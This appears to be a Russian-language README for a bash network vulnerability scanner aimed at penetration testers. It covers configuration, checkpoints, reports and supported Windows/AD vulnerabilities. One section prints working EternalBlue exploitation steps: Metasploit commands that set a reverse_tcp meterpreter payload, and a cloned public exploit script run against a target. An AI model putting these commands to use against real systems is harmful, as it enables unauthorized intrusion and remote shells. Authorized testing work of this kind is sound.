# 🔥 AKUMA'S ADVANCED LOW-HANGING FRUIT SCANNER v2.0

> **"Your infrastructure just got PWNED by science"** - AKUMA Team

## 🎯 НОВЫЕ ВОЗМОЖНОСТИ v2.0

✅ **Масштабируемость**: Поддержка 100+ подсетей  
✅ **Методы эксплуатации**: Детальные PoC инструкции  
✅ **Автоматизация**: Полная отказоустойчивость  
✅ **Отчётность**: Профессиональные отчёты с рекомендациями  
✅ **Recovery механизмы**: Возобновление сканирования  

---

## 🚀 БЫСТРЫЙ СТАРТ

### 1. Базовое сканирование одной подсети
```bash
./advanced_lowhanging_scanner.sh --config single_subnet_config.conf
```

### 2. Корпоративное сканирование 100+ сетей
```bash
./advanced_lowhanging_scanner.sh --config enterprise_scale_config.conf --debug
```

### 3. Сканирование с аутентификацией
```bash
./advanced_lowhanging_scanner.sh --auth --username pentest --password 'MyP@ss' --domain CORP
```

---

## 📋 КОНФИГУРАЦИОННЫЕ ФАЙЛЫ

### `single_subnet_config.conf` - Для малых сетей
- 1-5 подсетей
- Консервативные настройки 
- Быстрое тестирование

### `enterprise_scale_config.conf` - Для корпораций
- 100+ подсетей
- Оптимизированная параллелизация
- Recovery механизмы
- Checkpoint система

---

## 🛠️ НОВЫЕ ФУНКЦИИ

### 1. ФОРМАТЫ ВЫВОДА С ПОРТАМИ
Теперь все результаты содержат IP:PORT пары:
```
192.168.1.10:445
192.168.1.15:3389
10.0.0.5:80
```

### 2. МЕТОДЫ ЭКСПЛУАТАЦИИ В РЕЗУЛЬТАТАХ
Каждая найденная уязвимость включает:
```
[2025-09-09 00:37:26] 192.168.112.23 | ms17-010 | MS17-010 (EternalBlue) - CRITICAL RCE
[EXPLOITATION] EXPLOIT: use exploit/windows/smb/ms17_010_eternalblue | PoC: AutoBlue-MS17-010.git | FIX: Install MS17-010 patches + Disable SMBv1
```

### 3. ДЕТАЛЬНЫЕ PoC ГАЙДЫ
Автоматически генерируется `exploitation_guide.txt` с:
- Metasploit команды
- Python exploit скрипты  
- Nmap NSE проверки
- Пошаговые инструкции
- Рекомендации по исправлению

---

## 📊 ТИПЫ ОТЧЁТОВ

### 1. `vulnerability_summary.txt`
- Краткая статистика
- Критические находки
- Статистика по хостам

### 2. `exploitation_guide.txt` 
- **НОВИНКА v2.0!**
- Детальные методы эксплуатации
- PoC скрипты и команды
- Инструкции по исправлению
- CVE информация

### 3. `detailed_report.html`
- Визуальный HTML отчёт
- Интерактивные таблицы
- Цветовое кодирование приоритетов

---

## 🔧 RECOVERY И CHECKPOINT'Ы

### Автоматическое возобновление
```bash
# Прерванное сканирование автоматически создаёт checkpoint
./advanced_lowhanging_scanner.sh --resume

# Принудительно возобновить из последней точки
RESUME_SCAN=true ./advanced_lowhanging_scanner.sh --config my_config.conf
```

### Логи ошибок
Все ошибки сохраняются в:
- `failures.log` - общие ошибки
- `results/*.errors` - детальные ошибки по модулям

---

## 🎯 ПОДДЕРЖИВАЕМЫЕ УЯЗВИМОСТИ

### КРИТИЧЕСКИЕ (CRITICAL)
- **MS17-010 (EternalBlue)** - CVE-2017-0144
- **SMBGhost** - CVE-2020-0796  
- **Zerologon** - CVE-2020-1472
- **PrintNightmare** - CVE-2021-34527
- **PetitPotam** - CVE-2021-36942

### ВЫСОКИЕ (HIGH)
- Print Spooler коуэрсия
- WebDAV уязвимости
- SCCM конфигурации
- LSASS дампинг

### СРЕДНИЕ (MEDIUM)
- LDAP анонимный bind
- GPP пароли
- LAPS конфигурации
- RDP настройки

---

## 🚨 ДЕТАЛЬНЫЕ PoC ИНСТРУКЦИИ

Для каждой критической уязвимости включены:

### MS17-010 пример:
```bash
# Metasploit Framework:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [TARGET]
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [YOUR_IP]
exploit

# Manual exploit:
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
python eternalblue_exploit7.py [TARGET] shellcode/sc_x64.bin
```

---

## ⚡ ОПТИМИЗАЦИЯ ПРОИЗВОДИТЕЛЬНОСТИ

### Для больших сетей (100+ подсетей):
```bash
# В enterprise_scale_config.conf
MAX_PARALLEL=50
NMAP_THREADS=500
MAX_SUBNETS_PER_BATCH=5

# Увеличиваем лимиты системы
ulimit -n 65536
ulimit -u 32768
```

### Для быстрого сканирования:
```bash
# В quick_test_config.conf
MAX_PARALLEL=2
TIMEOUT_PER_HOST=60
NMAP_THREADS=10
```

---

## 🔒 БЕЗОПАСНОСТЬ И ЭТИКА

⚠️ **ВАЖНО**: Используйте только на авторизованных сетях!

- Получите письменное разрешение
- Документируйте все находки
- Не используйте эксплойты в продакшене
- Соблюдайте законы вашей юрисдикции

---

## 🆘 УСТРАНЕНИЕ НЕПОЛАДОК

### Сканирование прерывается
```bash
# Проверьте checkpoint
cat /path/to/scan_dir/.checkpoint

# Возобновите сканирование
RESUME_SCAN=true ./advanced_lowhanging_scanner.sh
```

### Нет результатов по уязвимостям
```bash
# Проверьте наличие хостов
cat scan_*/smb_hosts.txt

# Включите debug режим
DEBUG_MODE=true ./advanced_lowhanging_scanner.sh
```

### Проблемы с производительностью
```bash
# Уменьшите параллелизм
MAX_PARALLEL=5

# Увеличьте таймауты
TIMEOUT_PER_HOST=300
```

---

## 📞 ПОДДЕРЖКА

**База знаний**: `vulnerability_knowledge_base.sh`  
**Логи**: `scan_*/scanner.log`  
**Ошибки**: `scan_*/failures.log`

---

## 🔥 CHANGELOG v2.0

- ✅ Исправлен вывод портов (IP:PORT формат)
- ✅ Устранены прерывания в циклах
- ✅ Добавлены методы эксплуатации
- ✅ Система рекомендаций по исправлению
- ✅ Масштабируемость для 100+ подсетей
- ✅ Recovery и checkpoint система
- ✅ Детальные PoC гайды
- ✅ Полная автоматизация процесса

---

> **"With great power comes great responsibility... and potentially jail time"** - AKUMA 🔥
